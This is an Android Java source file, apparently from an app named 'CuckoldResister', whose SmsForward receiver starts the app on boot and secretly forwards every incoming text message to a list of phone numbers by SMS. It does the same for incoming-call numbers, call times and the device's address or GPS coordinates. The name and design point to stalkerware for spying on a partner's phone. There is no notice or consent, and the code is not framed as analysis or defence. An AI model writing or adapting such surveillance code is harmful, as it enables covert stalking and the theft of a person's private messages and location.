package com.Sven.CuckoldResister.CuckoldResister;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class SmsForward extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static MainActivity mActivity;
    private static List<String> phoneList = new ArrayList<String>();
    private static Calendar cal;
    private static double[] dl;
    private static SimpleDateFormat sdf;
    private static Context mContext;
    private static GPSTracker gps;

    //incmoing phone call
    private static int lastState = TelephonyManager.CALL_STATE_IDLE;
    private static Date callStartTime;
    private static boolean isIncoming;
    private static String savedNumber;  //because the passed incoming is only valid in ringing
    private static String address;


    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("sven", "onReceive");

        //auto boot
        if(intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
            Intent mBootIntent = new Intent(context, MainActivity.class);
            mBootIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(mBootIntent);
        }

        if (intent.getAction().equals(SMS_RECEIVED)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                //init
                MainActivity.InitGPS();

                // get sms objects
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus.length == 0) {
                    return;
                }
                // large message might be broken into many
                SmsMessage[] messages = new SmsMessage[pdus.length];
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    sb.append(messages[i].getMessageBody());
                }

                String sender = messages[0].getOriginatingAddress();
                String message = sb.toString();

                MainActivity.SetInfoMessage("Message Get: " + message);
                if (!message.startsWith("[Forward]")) {
                    Log.d("sven", "SMSFORWARD: start send message");
                    sendSMSMessage_sms(message, sender);
                }
            }
        }

        if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {
            switch (lastState) {
                case TelephonyManager.CALL_STATE_IDLE:
                    lastState = TelephonyManager.CALL_STATE_RINGING;
                    savedNumber = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
                    savedNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

                    String message = "[Get incoming phone call]: " + savedNumber;
                    MainActivity.SetInfoMessage("[Get incoming phone call]: " + message);
                    sendSMSMessage_sms_phone("INCOMING", savedNumber);
                    break;

                case TelephonyManager.CALL_STATE_RINGING:
                    lastState = TelephonyManager.CALL_STATE_IDLE;
                    savedNumber = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
                    savedNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

                    sendSMSMessage_sms_phone("CALLEND", savedNumber);
                    break;
            }
        }
    }


    public void sendSMSMessage_sms(String _message, String _phoneNumber) {
        //updateContext
        MainActivity mainActivity = new MainActivity();
        phoneList = mainActivity.getPhoneList();
        double[] dl = mainActivity.getGPS();
        Calendar cal = Calendar.getInstance();
        sdf = new SimpleDateFormat("HH:mm:ss");
        Location location = mainActivity.getLocation();
        address = mainActivity.getAddress();
        Log.d("sven","SMSFORWARD: address:" + address);

        try {
            for (int i = 0; i < phoneList.size(); i++) {
                SmsManager smsManager = SmsManager.getDefault();
                Log.d("sven", "SMSFORWARD: all configure done, sending....");
                smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + "[From Phone: " + _phoneNumber + "] "
                                + "[Time: " + sdf.format(cal.getTime()) + "] "
                                //+ "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
                                + "[Address:] " + address
                        , null, null);

                smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + _message
                        , null, null);


                Log.d("sven", "SMSFORWARD: sendSMSMessage_sms. message sent");
            }
        } catch (Exception e) {
            MainActivity.SetInfoMessage(e.getMessage());
        }
    }

    public void sendSMSMessage_sms_phone(String _message, String _phoneNumber) {
        //updateContext
        MainActivity mainActivity = new MainActivity();
        phoneList = mainActivity.getPhoneList();
        double[] dl = mainActivity.getGPS();
        Calendar cal = Calendar.getInstance();
        sdf = new SimpleDateFormat("HH:mm:ss");
        Location location = mainActivity.getLocation();
        address = mainActivity.getAddress();

        try {
            for (int i = 0; i < phoneList.size(); i++) {
                SmsManager smsManager = SmsManager.getDefault();
                switch (_message){
                    case "INCOMING":
                        smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + "[INCOMING PHONE][From Phone: " + _phoneNumber + "] "
                                        + "[Time: " + sdf.format(cal.getTime()) + "] "
                                        //+ "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
                                        + "[Address:] " + address
                                , null, null);
                        break;

                    case "RINGING":
                        smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + "[RINGING PHONE][From Phone: " + _phoneNumber + "] "
                                        + "[Time: " + sdf.format(cal.getTime()) + "] "
                                        + "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
                                        + "[Address:] " + address
                                , null, null);
                        break;

                    case "CALLEND":
                        smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + "[CALL END][From Phone: " + _phoneNumber + "] "
                                        + "[Time: " + sdf.format(cal.getTime()) + "] "
                                        //+ "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
                                        + "[Address:] " + address
                                , null, null);
                        break;

                }

            }
        } catch (Exception e) {
            MainActivity.SetInfoMessage(e.getMessage());
        }
    }

    public static void sendSMSMessage_sms_AddToList(String _phoneNumber) {
        MainActivity mainActivity = new MainActivity();
        phoneList = mainActivity.getPhoneList();
        try {
            for (int i = 0; i < phoneList.size(); i++) {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(phoneList.get(i), null, "[Notice] [Phone number: " + _phoneNumber + " had been added to green hat list]", null, null);
                MainActivity.SetInfoMessage("Forward Message to " + phoneList.get(i) + " added");
                Log.d("sven", "MainActivity. message sent");
            }
        } catch (Exception e) {
            MainActivity.SetInfoMessage(e.getMessage());
        }
    }

    //---------------------------in coming phone call-------------------------------
//
//    protected void onIncomingCallStarted(Context ctx, String number, Date start){}
//    protected void onOutgoingCallStarted(Context ctx, String number, Date start){}
//    protected void onIncomingCallEnded(Context ctx, String number, Date start, Date end){}
//    protected void onOutgoingCallEnded(Context ctx, String number, Date start, Date end){}
//    protected void onMissedCall(Context ctx, String number, Date start){}
//
//    //Deals with actual events
//
//    //Incoming call-  goes from IDLE to RINGING when it rings, to OFFHOOK when it's answered, to IDLE when its hung up
//    //Outgoing call-  goes from IDLE to OFFHOOK when it dials out, to IDLE when hung up
//    public void onCallStateChanged(Context context, int state, String number) {
//        if(lastState == state){
//            //No change, debounce extras
//            return;
//        }
//        switch (state) {
//            case TelephonyManager.CALL_STATE_RINGING:
//                isIncoming = true;
//                callStartTime = new Date();
//                savedNumber = number;
//                onIncomingCallStarted(context, number, callStartTime);
//                break;
//            case TelephonyManager.CALL_STATE_OFFHOOK:
//                //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
//                if(lastState != TelephonyManager.CALL_STATE_RINGING){
//                    isIncoming = false;
//                    callStartTime = new Date();
//                    onOutgoingCallStarted(context, savedNumber, callStartTime);
//                }
//                break;
//            case TelephonyManager.CALL_STATE_IDLE:
//                //Went to idle-  this is the end of a call.  What type depends on previous state(s)
//                if(lastState == TelephonyManager.CALL_STATE_RINGING){
//                    //Ring but no pickup-  a miss
//                    onMissedCall(context, savedNumber, callStartTime);
//                }
//                else if(isIncoming){
//                    onIncomingCallEnded(context, savedNumber, callStartTime, new Date());
//                }
//                else{
//                    onOutgoingCallEnded(context, savedNumber, callStartTime, new Date());
//                }
//                break;
//        }
//        lastState = state;
//    }
}